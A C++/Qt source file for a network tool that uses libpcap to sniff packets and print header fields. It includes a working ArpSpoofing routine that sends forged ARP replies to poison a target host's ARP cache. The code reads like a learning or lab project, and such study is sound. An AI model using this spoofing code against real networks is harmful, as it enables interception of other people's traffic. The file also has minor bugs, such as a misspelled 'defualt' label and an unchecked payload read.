#include "networkcontroller.h"

using namespace std;

NetworkController::NetworkController(QObject *parent)
    : QObject{parent}
{
    GetInterfaceInfo();
    if(!OpenPcap()) return;
}

NetworkController::~NetworkController() {
    for(const auto& pcap : pcaps_)
        pcap_close(pcap);
}

bool NetworkController::OpenPcap(const int timeout) {
    try {
        pcap_t* pcap;
        char errBuf[PCAP_ERRBUF_SIZE] {};

        for(const auto& interface : interfaceInfos_) {
            pcap = pcap_open_live(interface.interfaceName_.toStdString().c_str(), BUFSIZ, 1, timeout, errBuf);
            if(pcap == NULL) throw runtime_error("Failed to open pcap : " + string(errBuf));

            pcaps_.push_back(pcap);
        }
    }catch(const exception& e) {
        cerr<<"Create networkController : "<<e.what()<<endl;
        return false;
    }

    return true;
}

void NetworkController::GetInterfaceInfo() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        ifconf ifConfig{};
        char buffer[1024];

        ifConfig.ifc_len = sizeof(buffer);
        ifConfig.ifc_buf = buffer;

        if(ioctl(sock, SIOCGIFCONF, &ifConfig) == -1)
            throw runtime_error("Failed to set ioctl");

        int interfaceCnt = ifConfig.ifc_len / sizeof(ifreq);

        InterfaceInfo info{};


        if(interfaceCnt > 0) {
            for(int idx = 0; idx < interfaceCnt; idx++) {
                //interface name
                info.interfaceName_ = ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifrn.ifrn_name;
                if(ioctl(sock, SIOCGIFHWADDR, &ifConfig.ifc_ifcu.ifcu_req[idx]) == -1)
                    throw runtime_error("Failed to set ioctl");
                //mac-address
                info.mac_ = reinterpret_cast<u_char*>(ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifru.ifru_hwaddr.sa_data);

                interfaceInfos_.push_back(info);
            }
        }
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceInfo : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }


    close(sock);
}

//private
Mac NetworkController::GetMac(const QString& interface, const QString targetIP) {
    Mac ret{};
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to create socket");

        arpreq req{};

        memcpy(req.arp_dev, interface.toStdString().c_str(), sizeof(req.arp_dev));

        req.arp_pa.sa_family = AF_INET;
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);

        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

bool NetworkController::GetPacket(const QString& interface) {
    RecvData recvData{};

    pcap_t* pcap = nullptr;

    for(int i=0; i<interfaceInfos_.size(); i++)
        if(interfaceInfos_.at(i).interfaceName_ == interface) pcap = pcaps_.at(i);

    if(pcap == nullptr) return false;

    if(pcap_next_ex(pcap, &recvData.header, (const uchar**)&recvData.buf) != 1)
        return false;

    recvDatas_.push_back(recvData);

    return true;
}

//public
vector<QString> NetworkController::GetInterfaces() {
    vector<QString> ret;

    for(const auto& info : interfaceInfos_)
        ret.push_back(info.interfaceName_);

    return ret;
}

bool NetworkController::ArpSpoofing(const QString interface,const QString senderIP,const QString targetIP) {
    Mac targetMac = GetMac(interface, targetIP);

    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.tmac_ = targetMac;

        for(const auto& info : interfaceInfos_) {
            if(info.interfaceName_ == interface) {
                packet.eth_.smac_ = info.mac_;
                packet.arp_.smac_ = info.mac_;
            }
        }

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
        inet_pton(AF_INET, senderIP.toStdString().c_str(), &packet.arp_.sip_);
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &packet.arp_.dip_);

        pcap_t* pcap = nullptr;

        for(int i=0; i<interfaceInfos_.size(); i++)
            if(interfaceInfos_.at(i).interfaceName_ == interface) pcap = pcaps_.at(i);

        if(pcap == nullptr) throw runtime_error("Failed to find pcap opended");

        if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket)) == -1)
            throw runtime_error("Failed to send packet : " + string(pcap_geterr(pcap)));

    }catch(const std::exception& e) {
        cerr<<"Failed to ArpSpoofing : "<<e.what()<<endl;
        return false;
    }
    return true;
}

void NetworkController::ShowPacket(const QString interface,const uint16_t etherType, const QString ip, const IpHdr::PROTOCOL_ID_TYPE type) {
    while(!GetPacket(interface));
    QString ret;

    for(const auto& data : recvDatas_) {
        if(data.header->caplen < sizeof(EthHdr) + sizeof(IpHdr)) continue;
        EthHdr* etherHeader = reinterpret_cast<EthHdr*>(data.buf);
        ret.clear();

        ret.append("---Ethernet--- \r\n");
        ret.append("source mac address : " + string(etherHeader->smac()) + "\r\n");
        ret.append("destination mac address : " + string(etherHeader->dmac()) + "\r\n");

        if(etherHeader->type() != etherType) continue;

        switch(etherHeader->type()) {
            case EthHdr::Arp: {
                PArpHdr arpHeader = reinterpret_cast<PArpHdr>(data.buf + sizeof(EthHdr));
                ret.append("-----ARP----- \r\n");

                ret.append("op code : " + (arpHeader->opCode() == ArpHdr::OpCodeType::Arp_Reply
                               ? "REPLY" : arpHeader->opCode() == ArpHdr::OpCodeType::Arp_Request
                               ? "REQUEST" : to_string(arpHeader->opCode())) + "\r\n");

                ret.append("sender mac address : " + string(arpHeader->smac()) + "\r\n");
                ret.append("sender ip : " + arpHeader->sip() + "\r\n");
                ret.append("target mac address : " + string(arpHeader->tmac()) + "\r\n");
                ret.append("target ip : " + arpHeader->dip() + "\r\n");
                arpHeader->smac();

                break;
            }
            case EthHdr::Ip4: {
                    IpHdr* ipHeader = reinterpret_cast<IpHdr*>(data.buf + sizeof(EthHdr));

                    if(ip.isEmpty() || (ipHeader->sip().compare(ip.toStdString()) == 0 || ipHeader->dip().compare(ip.toStdString()) == 0)) {
                        //if(ipHeader->sip().compare(ip.toStdString()) == 0 || ipHeader->dip().compare(ip.toStdString()) == 0) {
                        if(ipHeader->protocolId_ != type) continue;

                        ret.append("------IP------ \r\n");
                        ret.append("source ip : " + ipHeader->sip() + "\r\n");
                        ret.append("destination ip : "  + ipHeader->dip() + "\r\n");

                        switch(ipHeader->protocolId_) {
                            case IpHdr::PROTOCOL_ID_TYPE::IPv4: {
                                // cout<<"---IP---"<<endl;
                                // cout<<"source ip : "<<ipHeader->sip()<<endl;;
                                // cout<<"destination ip : "<<ipHeader->dip()<<endl;;
                                break;
                            }
                            case IpHdr::PROTOCOL_ID_TYPE::ICMP: {
                                // cout<<"---ICMP---"<<endl;
                                // cout<<"----------"<<endl;
                                break;
                            }
                            case IpHdr::PROTOCOL_ID_TYPE::TCP: {
                                TcpHdr* tcpHeader = reinterpret_cast<TcpHdr*>(data.buf + sizeof(EthHdr) + ipHeader->len());

                                ret.append("-----TCP------ \r\n");
                                ret.append("source port : " + QString::number(tcpHeader->sPort()) + "\r\n");
                                ret.append("destination port : " + QString::number(tcpHeader->dPort()) + "\r\n");

                                if(ipHeader->totalLen() - (ipHeader->len() + tcpHeader->len()) > 0) {
                                    //uint8_t* payLoad = data.buf + sizeof(EthHdr) + offset);
                                    uint8_t* payLoad = data.buf + sizeof(EthHdr) + (ipHeader->len() + tcpHeader->len());
                                    ret.append("payload : ");
                                    for(int i=0; i<20; i++)
                                        ret.append(QString("%1").arg(payLoad[i], 2, 16, QLatin1Char('0')));
                                    ret.append("\r\n");
                                }
                                ret.append("-------------- \r\n");
                                break;
                            }
                            defualt:
                                break;
                        }
                    }
                    break;
                }

            default:
                    break;
            }
        cout<<ret.toStdString()<<endl;
    }

    recvDatas_.clear();
}
